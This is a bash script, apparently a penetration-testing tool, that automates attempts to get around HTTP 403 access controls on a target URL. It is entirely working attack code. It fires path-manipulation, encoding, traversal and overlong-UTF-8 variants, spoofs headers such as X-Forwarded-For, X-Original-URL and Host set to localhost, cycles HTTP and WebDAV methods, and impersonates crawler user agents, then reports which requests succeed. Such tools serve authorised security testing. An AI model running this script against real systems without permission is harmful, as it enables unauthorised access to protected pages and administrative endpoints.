#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Initialize array/constants
declare -A STATUS_CODES
TOTAL_TESTS=0
SUCCESS_COUNT=0

# Check if curl is installed
if ! command -v curl &>/dev/null; then
	echo -e "${RED}Error: curl is not installed${NC}"
	exit 1
fi

# Banner function
banner() {
	echo -e "${MAGENTA}"
	cat <<"EOF"
     ____ ___  ____   __
    / / // _ \|_  /  / /  __ _____  ___ ____ ___
   /_  _/ // //_ <  / _ \/ // / _ \/ _ `(_-<(_-
    /_/ \___/____/ /_.__/\_, / .__/\_,_/___/___/
                        /___/_/

              403 Bypass Testing V1.0
              by olofmagn
EOF
	echo -e "${NC}"
}

# Help function
help() {
	echo "Usage: $0 -u <URL> [-o output_file]"
	echo ""
	echo "Options:"
	echo "  -u <URL>    Target URL to test for bypasses"
	echo "  -o <FILE>   Save results to file (optional)"
	echo "  -h          Show this help message"
	echo ""
	echo "Example:"
	echo "  $0 -u https://test.com/manager/status"
	echo "  $0 -u test.com/admin -o results.txt"
	exit 0
}

# Summary function
summary() {
	echo ""
	echo -e "${GREEN}===== SCAN COMPLETE =====${NC}"
	echo -e "Base URL: ${MAGENTA}$BASE_URL${NC}"
	echo -e "Target path: ${MAGENTA}$TARGET_PATH${NC}"
	echo -e "Total tests run: ${MAGENTA}$TOTAL_TESTS${NC}"
	echo -e "Successful bypasses: ${MAGENTA}$SUCCESS_COUNT${NC}"
	if [ -n "$OUTPUT_FILE" ]; then
		echo -e "Output file: ${MAGENTA}$OUTPUT_FILE${NC}"
	fi
	echo -e "${GREEN}=========================${NC}"
	echo ""
}

# Statistics function
statistics() {
	echo -e "${BLUE}═══════════════════════════════════════${NC}"
	echo -e "${BLUE}[RESPONSE STATISTICS]${NC}"
	echo -e "${BLUE}═══════════════════════════════════════${NC}\n"

	# Check if we have any status codes to report
	if [ ${#STATUS_CODES[@]} -eq 0 ]; then
		echo -e "  ${YELLOW}No responses recorded${NC}\n"
		return
	fi

	# Sort status codes
	for code in $(echo "${!STATUS_CODES[@]}" | tr ' ' '\n' | sort -n); do
		count=${STATUS_CODES[$code]}

		case $code in
		2*)
			color=$GREEN
			symbol="✓"
			;;
		3*)
			color=$BLUE
			symbol="→"
			;;
		4*)
			color=$YELLOW
			symbol="!"
			;;
		5*)
			color=$RED
			symbol="✗"
			;;
		*)
			color=$NC
			symbol="?"
			;;
		esac

		echo -e "  ${color}[$symbol] HTTP $code:${NC} $count $([ $count -eq 1 ] && echo 'request' || echo 'requests')"
	done

	echo ""
}

# Httpcode result function
httpcode_result() {
	if [[ "$http_code" =~ ^(200|201|204|301|302)$ ]]; then
		echo -e "${GREEN}[✓] $http_code${NC} - $test_name"
		echo -e "    ${WHITE}URL:${NC} $test_url"
		echo -e "    ${WHITE}Size:${NC} ${size_bytes} bytes"
		echo -e "    ${CYAN}Curl:${NC} $curl_cmd"
		echo ""

		# Save to file if args specified
		if [ -n "$OUTPUT_FILE" ]; then
			echo "[$http_code] $test_name" >>"$OUTPUT_FILE"
			echo "  URL: $test_url" >>"$OUTPUT_FILE"
			echo "  Command: $curl_cmd" >>"$OUTPUT_FILE"
			echo "" >>"$OUTPUT_FILE"
		fi

		((SUCCESS_COUNT++))

	# Display interesting responses
	elif [[ ! "$http_code" =~ ^(401|403|404|0)$ ]]; then
		echo -e "${YELLOW}[?] $http_code${NC} - $test_name"
		echo -e "    ${WHITE}URL:${NC} $test_url"
		echo -e "    ${WHITE}Size:${NC} ${size_bytes} bytes"
		echo -e "    ${CYAN}Curl:${NC} $curl_cmd"
		echo ""
	fi
}

# Result function
result() {
	if [ $SUCCESS_COUNT -gt 0 ]; then
		echo -e "${GREEN}[+] Found $SUCCESS_COUNT potential bypass(es)!${NC}\n"
		# Save summary to output file if specified
		if [ -n "$OUTPUT_FILE" ]; then
			echo "" >>"$OUTPUT_FILE"
			echo "================================" >>"$OUTPUT_FILE"
			echo "Total bypasses found: $SUCCESS_COUNT" >>"$OUTPUT_FILE"
			echo -e "${GREEN}[*] Results saved to: $OUTPUT_FILE${NC}\n"
		fi
	else
		echo -e "${RED}[-] No bypasses found${NC}\n"
	fi
}

# Test url function
test_url() {
	local test_name="$1"
	local test_url="$2"
	local extra_args="$3"

	((TOTAL_TESTS++))

	# Make request and capture status code with default User-Agent
	curl_args=(-sk -o /dev/null -w "%{http_code} %{size_download}" --max-time 10 --connect-timeout 5 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

	if [ -n "$extra_args" ]; then
		# Check if method is specified
		if [[ "$extra_args" =~ ^-X[[:space:]]+(.+)$ ]]; then
			method="${BASH_REMATCH[1]}"
			curl_args+=(-X "$method")
		else
			# Parse headers
			eval "header_array=($extra_args)"
			for element in "${header_array[@]}"; do
				if [[ "$element" == -H ]]; then
					continue
				fi
				# Remove surrounding quotes if present
				element="${element#\'}"
				element="${element%\'}"
				element="${element#\"}"
				element="${element%\"}"
				curl_args+=(-H "$element")
			done
		fi
	fi

	curl_args+=("$test_url")

	# Prepare display command
	curl_cmd="curl -i -sk"
	if [ -n "$extra_args" ]; then
		curl_cmd="$curl_cmd $extra_args"
	fi

	curl_cmd="$curl_cmd '$test_url'"

	# Run curl command with the arguments
	response=$(curl "${curl_args[@]}" 2>/dev/null || echo "0 0")
	http_code=$(echo "$response" | awk '{print $1}')
	size_bytes=$(echo "$response" | awk '{print $2}')

	# Validate HTTP code is numeric
	if ! [[ "$http_code" =~ ^[0-9]+$ ]]; then
		http_code="0"
	fi

	# Increment status code counter
	STATUS_CODES[$http_code]=$((${STATUS_CODES[$http_code]:-0} + 1))

	# Run httpcode result
	httpcode_result
}

# Parse arguments
while getopts "u:o:h" opt; do
	case $opt in
	u) URL="$OPTARG" ;;
	o) OUTPUT_FILE="$OPTARG" ;;
	h) help ;;
	*)
		echo -e "${RED}Invalid option${NC}"
		help
		;;
	esac
done

# Validate URL is provided
if [ -z "$URL" ]; then
	echo -e "${RED}URL is required${NC}\n"
	help
fi

# Add protocol if missing
if [[ ! "$URL" =~ ^https?:// ]]; then
	echo -e "${YELLOW}No protocol specified, adding https://${NC}"
	URL="https://$URL"
fi

# Parse URL into base and path
if [[ "$URL" =~ ^(https?://[^/]+)(.*)$ ]]; then
	BASE_URL="${BASH_REMATCH[1]}"
	TARGET_PATH="${BASH_REMATCH[2]}"
	[ -z "$TARGET_PATH" ] && TARGET_PATH="/"
else
	echo -e "${RED}Could not parse URL${NC}"
	exit 1
fi

# Initialize output file if specified
if [ -n "$OUTPUT_FILE" ]; then
	{
		echo "403 Bypass Test Results"
		echo "======================"
		echo "Target: $BASE_URL$TARGET_PATH"
		echo "Date: $(date)"
		echo ""
	} >"$OUTPUT_FILE"
fi

# Run banner
banner

# Display initial info
echo -e "${YELLOW}[*] Target: ${NC}$BASE_URL"
echo -e "${YELLOW}[*] Target path: ${NC}$TARGET_PATH"
if [ -n "$OUTPUT_FILE" ]; then
	echo -e "${YELLOW}[*] Outputfile: ${NC}$OUTPUT_FILE"
fi
echo -e "${YELLOW}[*] Starting tests...${NC}\n"

echo -e "${BLUE}═══════════════════════════════════════${NC}"
echo -e "${BLUE}[PATH BYPASS TESTS]${NC}"
echo -e "${BLUE}═══════════════════════════════════════${NC}\n"

# ===== PATH BYPASS TESTS =====

# Prepare path variations
path_no_slash="${TARGET_PATH#/}"
path_backslash="${path_no_slash//\//$'\\'}"
path_mixed=$(echo "$TARGET_PATH" | awk '{
	for(i=1;i<=length($0);i++){
		c=substr($0,i,1);
		if(i%2==0) printf toupper(c); else printf c
	}
}')

# === Extension Manipulation ===
test_url "HTML extension" "$BASE_URL${TARGET_PATH}.html"
test_url "TXT extension" "$BASE_URL${TARGET_PATH}.txt"
test_url "BAK extension" "$BASE_URL${TARGET_PATH}.bak"
test_url "PHP extension" "$BASE_URL${TARGET_PATH}.php"
test_url "JSON extension" "$BASE_URL${TARGET_PATH}.json"
test_url "JSP extension" "$BASE_URL${TARGET_PATH}.jsp"
test_url "ASP extension" "$BASE_URL${TARGET_PATH}.asp"
test_url "ASPX extension" "$BASE_URL${TARGET_PATH}.aspx"

# === BASIC PATH VARIATIONS ===

# Trailing / Structural variations
test_url "Standard path" "$BASE_URL$TARGET_PATH"
test_url "Trailing slash" "$BASE_URL${TARGET_PATH}/"
test_url "Double trailing slash" "$BASE_URL${TARGET_PATH}//"
test_url "Trailing dot" "$BASE_URL$TARGET_PATH/."
test_url "Trailing dot-dot" "$BASE_URL$TARGET_PATH/.."
test_url "Trailing dot-slash" "$BASE_URL$TARGET_PATH/./"

# Slash injection variations
test_url "Double slash (start)" "$BASE_URL//${path_no_slash}"
test_url "Double slash (start and end)" "$BASE_URL//${path_no_slash}//"
test_url "Triple slash (start and end)" "$BASE_URL///${path_no_slash}///"
test_url "Leading wildcard" "$BASE_URL/*${path_no_slash}"
test_url "Trailing wildcard" "$BASE_URL${TARGET_PATH}/*"

# Wildcard / Dot-slash / Case variants
test_url "Dot-slash prefix" "$BASE_URL/.$TARGET_PATH"
test_url "Double slash + trailing dot-slash" "$BASE_URL//${path_no_slash}/."
test_url "Double slash + semicolon" "$BASE_URL//;/${path_no_slash}"
test_url "Triple slash + uppercase" "$BASE_URL///${path_no_slash^^}///"
test_url "Uppercase" "$BASE_URL${TARGET_PATH^^}"
test_url "Backslash" "$BASE_URL/$path_backslash"
test_url "Mixed case" "$BASE_URL$path_mixed"

# === Query & Fragment Bypasses ===
test_url "Empty query" "$BASE_URL${TARGET_PATH}?"
test_url "Query with param" "$BASE_URL${TARGET_PATH}?test=1"
test_url "Query with anything" "$BASE_URL${TARGET_PATH}?anything"
test_url "Multiple query params" "$BASE_URL${TARGET_PATH}?a=1&b=2"
test_url "Fragment" "$BASE_URL${TARGET_PATH}#fragment"
test_url "Query + Fragment" "$BASE_URL${TARGET_PATH}?test=1#fragment"

# === ENCODING BYPASSES ===
test_url "Encoded leading slash" "$BASE_URL/%2f${path_no_slash}"
test_url "Dot encoding (%2e)" "$BASE_URL/%2e$TARGET_PATH"
test_url "Double Dot encoding (%2e%2e)" "$BASE_URL/%2e%2e$TARGET_PATH"
test_url "Encoded slash (%2f)" "$BASE_URL${TARGET_PATH}%2f"
test_url "Double encoding (%252f)" "$BASE_URL${TARGET_PATH}%252f"
test_url "Space encoding (%20)" "$BASE_URL${TARGET_PATH}%20"
test_url "Tab encoding (%09)" "$BASE_URL${TARGET_PATH}%09"
test_url "Null byte (%00)" "$BASE_URL${TARGET_PATH}%00"
test_url "Newline injection (%0a)" "$BASE_URL${TARGET_PATH}%0a"
test_url "Carriage return (%0d)" "$BASE_URL${TARGET_PATH}%0d"

# Unicode/UTF-8 overlong encoding
test_url "Unicode overlong slash (direct)" "$BASE_URL/%c0%af${path_no_slash}"
test_url "Unicode overlong slash (double)" "$BASE_URL/%c0%af$TARGET_PATH"
test_url "Unicode overlong dot" "$BASE_URL/%c0%2e${TARGET_PATH}"
test_url "Unicode dot-dot" "$BASE_URL/%c0%2e%c0%2e${TARGET_PATH}"
test_url "UTF-8 3-byte slash (direct)" "$BASE_URL/%e0%80%af${path_no_slash}"
test_url "UTF-8 3-byte slash (double)" "$BASE_URL/%e0%80%af$TARGET_PATH"

# Mixed encoding combinations
test_url "Mixed encoding slash+dot (direct)" "$BASE_URL/%2f%2e${path_no_slash}"
test_url "Mixed encoding dot+slash (direct)" "$BASE_URL/%2e%2f${path_no_slash}"
test_url "Mixed encoding dot+slash (double)" "$BASE_URL/%2e%2f$TARGET_PATH"

# Encode special characters
test_url "Encoded & (%26)" "$BASE_URL${TARGET_PATH}%26"
test_url "Encoded # (%23)" "$BASE_URL${TARGET_PATH}%23"
test_url "Encoded ? (%3f)" "$BASE_URL${TARGET_PATH}%3f"
test_url "Encoded ; (%3b)" "$BASE_URL${TARGET_PATH}%3b"
test_url "Encoded % (%25)" "$BASE_URL${TARGET_PATH}%25"
test_url "Encoded backslash (%5c)" "$BASE_URL${TARGET_PATH}%5c"
test_url "Invalid byte (%ff)" "$BASE_URL${TARGET_PATH}%ff"

# === PATH TRAVERSAL & SPECIAL CHARS ===
test_url "Dot directory traversal" "$BASE_URL/...$TARGET_PATH/..."
test_url "Triple dot" "$BASE_URL${TARGET_PATH}/..."
test_url "Semicolon (..;/)" "$BASE_URL${TARGET_PATH}..;/"
test_url "Path parameter (;/)" "$BASE_URL${TARGET_PATH};/"
test_url "Path param ;x" "$BASE_URL${TARGET_PATH};x"
test_url "Path param ;x/" "$BASE_URL${TARGET_PATH};x/"
test_url "Mixed traversal" "$BASE_URL${TARGET_PATH}/../.."
test_url "Traversal + semicolon" "$BASE_URL${TARGET_PATH}/../;/"
test_url "Traversal with dots" "$BASE_URL${TARGET_PATH}/.././../"
test_url "Path reset (/;)" "$BASE_URL/;/${path_no_slash}"
test_url "Fake path x/../" "$BASE_URL${TARGET_PATH}/x/../"
test_url "Fake path x/..;/" "$BASE_URL${TARGET_PATH}/x/..;/"
test_url "Random subdirectory" "$BASE_URL${TARGET_PATH}/.randomstring"

echo -e "\n${BLUE}═══════════════════════════════════════${NC}"
echo -e "${BLUE}[HEADER BYPASS TESTS]${NC}"
echo -e "${BLUE}═══════════════════════════════════════${NC}\n"

# ===== HEADER BYPASS TESTS =====

# IP Spoofing Headers
test_url "X-Originating-IP" "$BASE_URL$TARGET_PATH" "-H 'X-Originating-IP: 127.0.0.1'"
test_url "X-Forwarded-For" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-For: 127.0.0.1'"
test_url "Forwarded-For" "$BASE_URL$TARGET_PATH" "-H 'Forwarded-For: 127.0.0.1'"
test_url "X-Forwarded" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded: 127.0.0.1'"
test_url "X-Remote-IP" "$BASE_URL$TARGET_PATH" "-H 'X-Remote-IP: 127.0.0.1'"
test_url "X-Remote-Addr" "$BASE_URL$TARGET_PATH" "-H 'X-Remote-Addr: 127.0.0.1'"
test_url "X-ProxyUser-Ip" "$BASE_URL$TARGET_PATH" "-H 'X-ProxyUser-Ip: 127.0.0.1'"
test_url "X-Client-IP" "$BASE_URL$TARGET_PATH" "-H 'X-Client-IP: 127.0.0.1'"
test_url "Client-IP" "$BASE_URL$TARGET_PATH" "-H 'Client-IP: 127.0.0.1'"
test_url "CF-Connecting-IP" "$BASE_URL$TARGET_PATH" "-H 'CF-Connecting-IP: 127.0.0.1'"
test_url "True-Client-IP" "$BASE_URL$TARGET_PATH" "-H 'True-Client-IP: 127.0.0.1'"
test_url "Cluster-Client-IP" "$BASE_URL$TARGET_PATH" "-H 'Cluster-Client-IP: 127.0.0.1'"
test_url "X-Real-IP" "$BASE_URL$TARGET_PATH" "-H 'X-Real-IP: 127.0.0.1'"

# Localhost variations
test_url "X-Forwarded-For: localhost" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-For: localhost'"
test_url "X-Forwarded-For: 0.0.0.0" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-For: 0.0.0.0'"
test_url "X-Forwarded-For: [::1]" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-For: ::1'"
test_url "Host: localhost" "$BASE_URL$TARGET_PATH" "-H 'Host: localhost'"
test_url "Host: 127.0.0.1" "$BASE_URL$TARGET_PATH" "-H 'Host: 127.0.0.1'"
test_url "Host: 127.0.0.1:80" "$BASE_URL$TARGET_PATH" "-H 'Host: 127.0.0.1:80'"
test_url "Host: 127.0.0.1:443" "$BASE_URL$TARGET_PATH" "-H 'Host: 127.0.0.1:443'"
test_url "Host: 127.0.0.1:8080" "$BASE_URL$TARGET_PATH" "-H 'Host: 127.0.0.1:8080'"
test_url "Host: 0.0.0.0" "$BASE_URL$TARGET_PATH" "-H 'Host: 0.0.0.0'"

# URL Rewrite Headers
test_url "X-Original-URL (root)" "$BASE_URL/" "-H 'X-Original-URL: $TARGET_PATH'"
test_url "X-Original-URL (public)" "$BASE_URL/public" "-H 'X-Original-URL: $TARGET_PATH'"
test_url "X-Original-URL (anything)" "$BASE_URL/anything" "-H 'X-Original-URL: $TARGET_PATH'"
test_url "X-Rewrite-URL (root)" "$BASE_URL/" "-H 'X-Rewrite-URL: $TARGET_PATH'"
test_url "X-Rewrite-URL (public)" "$BASE_URL/public" "-H 'X-Rewrite-URL: $TARGET_PATH'"
test_url "X-Rewrite-URL (anything)" "$BASE_URL/anything" "-H 'X-Rewrite-URL: $TARGET_PATH'"

# Forwarded-Port Headers
test_url "X-Forwarded-Port: 80" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-Port: 80'"
test_url "X-Forwarded-Port: 443" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-Port: 443'"
test_url "X-Forwarded-Port: 8080" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-Port: 8080'"
test_url "X-Forwarded-Port: 1337" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-Port: 1337'"

# === Custom Headers ===
test_url "X-Custom-IP-Authorization" "$BASE_URL$TARGET_PATH" "-H 'X-Custom-IP-Authorization: 127.0.0.1'"
test_url "X-Forwarded-Host: localhost" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-Host: localhost'"
test_url "X-Forwarded-Server: localhost" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-Server: localhost'"
test_url "X-Host" "$BASE_URL$TARGET_PATH" "-H 'X-Host: 127.0.0.1'"
test_url "X-HTTP-Host-Override" "$BASE_URL$TARGET_PATH" "-H 'X-HTTP-Host-Override: 127.0.0.1'"

# Referer & Authorization
test_url "Referer: localhost" "$BASE_URL$TARGET_PATH" "-H 'Referer: http://localhost'"
test_url "Referer: same domain" "$BASE_URL$TARGET_PATH" "-H 'Referer: $BASE_URL'"
test_url "X-Authorized" "$BASE_URL$TARGET_PATH" "-H 'X-Authorized: true'"
test_url "Authorization: Bearer token" "$BASE_URL$TARGET_PATH" "-H 'Authorization: Bearer null'"

# === Combined Headers ===
test_url "Multi: XFF + Origin + Host" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'Host: localhost'"
test_url "Multi: XFF + X-Real-IP + Client-IP" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'Client-IP: 127.0.0.1'"
test_url "Multi: Proxy + Host" "$BASE_URL$TARGET_PATH" "-H 'X-ProxyUser-Ip: 127.0.0.1' -H 'Host: localhost'"
test_url "Multi: All localhost IPs" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'Client-IP: 127.0.0.1'"

# SSL/Protocol combinations
test_url "Multi: SSL Proxy Chain" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-For: 127.0.0.1' -H 'X-Forwarded-Proto: https' -H 'X-Forwarded-Port: 443'"
test_url "Multi: SSL Host Override" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-Proto: https' -H 'X-Forwarded-Host: localhost' -H 'X-Forwarded-Port: 443'"
test_url "Multi: Legacy SSL" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-Proto: https' -H 'X-Forwarded-Ssl: on' -H 'X-Forwarded-Port: 443'"
test_url "Multi: Multi-Protocol" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-Proto: https' -H 'X-Url-Scheme: https' -H 'X-Forwarded-Ssl: on'"
test_url "Multi: Front-End HTTPS" "$BASE_URL$TARGET_PATH" "-H 'Front-End-Https: on' -H 'X-Forwarded-Proto: https' -H 'X-Forwarded-For: 127.0.0.1'"

# URL Rewrite combinations
test_url "Multi: Double Rewrite" "$BASE_URL$TARGET_PATH" "-H 'X-Original-URL: $TARGET_PATH' -H 'X-Rewrite-URL: $TARGET_PATH'"
test_url "Multi: Rewrite + Host" "$BASE_URL/" "-H 'X-Original-URL: $TARGET_PATH' -H 'Host: localhost'"
test_url "Multi: Prefix Override" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-Prefix: /v1' -H 'X-Original-URL: $TARGET_PATH'"
test_url "Multi: Absolute Path" "$BASE_URL/" "-H 'X-Original-URL: http://localhost$TARGET_PATH' -H 'X-Forwarded-For: 127.0.0.1'"

# RFC 7239 standard
test_url "Multi: RFC 7239 Basic" "$BASE_URL$TARGET_PATH" "-H 'Forwarded: for=127.0.0.1;proto=https;host=localhost'"
test_url "Multi: RFC 7239 Extended" "$BASE_URL$TARGET_PATH" "-H 'Forwarded: for=127.0.0.1;host=localhost;proto=https;by=127.0.0.1'"
test_url "Multi: RFC + Legacy" "$BASE_URL$TARGET_PATH" "-H 'Forwarded: for=127.0.0.1;proto=https' -H 'X-Forwarded-For: 127.0.0.1'"

# Hop-by-hop bypass (CVE-2022-31813)
test_url "Multi: Connection Bypass" "$BASE_URL$TARGET_PATH" "-H 'Connection: close, X-Forwarded-For' -H 'X-Forwarded-For: 127.0.0.1'"
test_url "Multi: Full Hop Bypass" "$BASE_URL$TARGET_PATH" "-H 'Connection: close, X-Forwarded-For, X-Forwarded-Host' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Forwarded-Host: localhost'"

# IP chain variations
test_url "Multi: IP Chain" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-For: 127.0.0.1, 127.0.0.1' -H 'X-Real-IP: 127.0.0.1'"
test_url "Multi: Cloudflare Mix" "$BASE_URL$TARGET_PATH" "-H 'CF-Connecting-IP: 127.0.0.1' -H 'True-Client-IP: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1'"
test_url "Multi: IPv6 Localhost" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-For: ::1' -H 'X-Real-IP: ::1' -H 'Host: localhost'"
test_url "Multi: Cluster Headers" "$BASE_URL$TARGET_PATH" "-H 'Cluster-Client-IP: 127.0.0.1' -H 'X-ProxyUser-Ip: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1'"
test_url "Multi: Private IP Range" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-For: 10.0.0.1' -H 'X-Real-IP: 10.0.0.1' -H 'Host: 10.0.0.1'"

# Host combinations
test_url "Multi: Multi-Host Override" "$BASE_URL$TARGET_PATH" "-H 'Host: localhost' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'X-Forwarded-Host: localhost'"
test_url "Multi: Server Override" "$BASE_URL$TARGET_PATH" "-H 'X-Forwarded-Server: localhost' -H 'X-Forwarded-Host: localhost' -H 'X-Forwarded-For: 127.0.0.1'"
test_url "Multi: HTTP Host Override" "$BASE_URL$TARGET_PATH" "-H 'X-HTTP-Host-Override: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: localhost'"
test_url "Multi: Host with Port" "$BASE_URL$TARGET_PATH" "-H 'Host: 127.0.0.1:80' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Forwarded-Port: 80'"

# Edge cases
test_url "Multi: Referer + Origin" "$BASE_URL$TARGET_PATH" "-H 'Origin: https://localhost' -H 'Host: localhost' -H 'X-Forwarded-For: 127.0.0.1'"
test_url "Multi: Bearer + Localhost" "$BASE_URL$TARGET_PATH" "-H 'Authorization: Bearer null' -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: localhost'"

echo -e "\n${BLUE}═══════════════════════════════════════${NC}"
echo -e "${BLUE}[HTTP METHOD TESTS]${NC}"
echo -e "${BLUE}═══════════════════════════════════════${NC}\n"

# === HTTP METHOD TESTS ===

# Safe/Read methods
test_url "GET method" "$BASE_URL$TARGET_PATH" "-X GET"
test_url "HEAD method" "$BASE_URL$TARGET_PATH" "-X HEAD"
test_url "OPTIONS method" "$BASE_URL$TARGET_PATH" "-X OPTIONS"

# Write methods
test_url "POST method" "$BASE_URL$TARGET_PATH" "-X POST"
test_url "PUT method" "$BASE_URL$TARGET_PATH" "-X PUT"
test_url "PATCH method" "$BASE_URL$TARGET_PATH" "-X PATCH"
test_url "DELETE method" "$BASE_URL$TARGET_PATH" "-X DELETE"

# Uncommon/Debug methods
test_url "TRACE method" "$BASE_URL$TARGET_PATH" "-X TRACE"
test_url "CONNECT method" "$BASE_URL$TARGET_PATH" "-X CONNECT"

# WebDAV methods
test_url "PROPFIND method" "$BASE_URL$TARGET_PATH" "-X PROPFIND"
test_url "PROPPATCH method" "$BASE_URL$TARGET_PATH" "-X PROPPATCH"
test_url "MKCOL method" "$BASE_URL$TARGET_PATH" "-X MKCOL"
test_url "COPY method" "$BASE_URL$TARGET_PATH" "-X COPY"
test_url "MOVE method" "$BASE_URL$TARGET_PATH" "-X MOVE"
test_url "LOCK method" "$BASE_URL$TARGET_PATH" "-X LOCK"
test_url "UNLOCK method" "$BASE_URL$TARGET_PATH" "-X UNLOCK"

echo -e "\n${BLUE}═══════════════════════════════════════${NC}"
echo -e "${BLUE}[USER-AGENT BYPASS TESTS]${NC}"
echo -e "${BLUE}═══════════════════════════════════════${NC}\n"

# === USER-AGENT TESTS ===

# Browser user-agents
test_url "UA: Chrome Windows" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19'"
test_url "UA: Firefox 3 Windows" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008092215 Firefox/3.0.1'"
test_url "UA: Firefox 2 Windows" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.x.x) Gecko/20041107 Firefox/x.x'"
test_url "UA: Firefox Mac" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5'"
test_url "UA: Safari Mac" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/xxx.x (KHTML like Gecko) Safari/12x.x'"
test_url "UA: iPhone" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Apple iPhone v1.1.4 CoreMedia v1.0.0.4A102'"
test_url "UA: IE 6" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Deepnet Explorer)'"
test_url "UA: Opera" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (SunOS 5.8 sun4u; U) Opera 5.0 [en]'"
test_url "UA: Camino Mac" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.0.1) Gecko/20030306 Camino/0.7'"
test_url "UA: OmniWeb Mac" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/xx (KHTML like Gecko) OmniWeb/v5xx.xx'"
test_url "UA: Netscape Windows" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1'"
test_url "UA: Netscape Mac" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (Macintosh; U; PPC; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1'"

# Search engine bots
test_url "UA: Googlebot" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'"
test_url "UA: Yahoo Slurp" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)'"
test_url "UA: Bingbot" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'"
test_url "UA: DuckDuckBot" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)'"

# Archival & research bots
test_url "UA: Archive.org Bot" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (compatible; archive.org_bot/1.13.1x +http://crawler.archive.org)'"
test_url "UA: Ask Jeeves" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)'"

# Crawlers & monitoring
test_url "UA: BecomeBot" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (compatible; BecomeBot/2.3; +http://www.become.com/webmasters.html)'"
test_url "UA: Exabot" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (compatible; Exabot Test/3.0; +http://www.exabot.com/go/robot)'"
test_url "UA: Uptimerobot" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Mozilla/5.0 (compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)'"

# Tools & special cases
test_url "UA: curl 7.x" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: curl/7.64.1'"
test_url "UA: Wget" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: Wget/1.20.3 (linux-gnu)'"
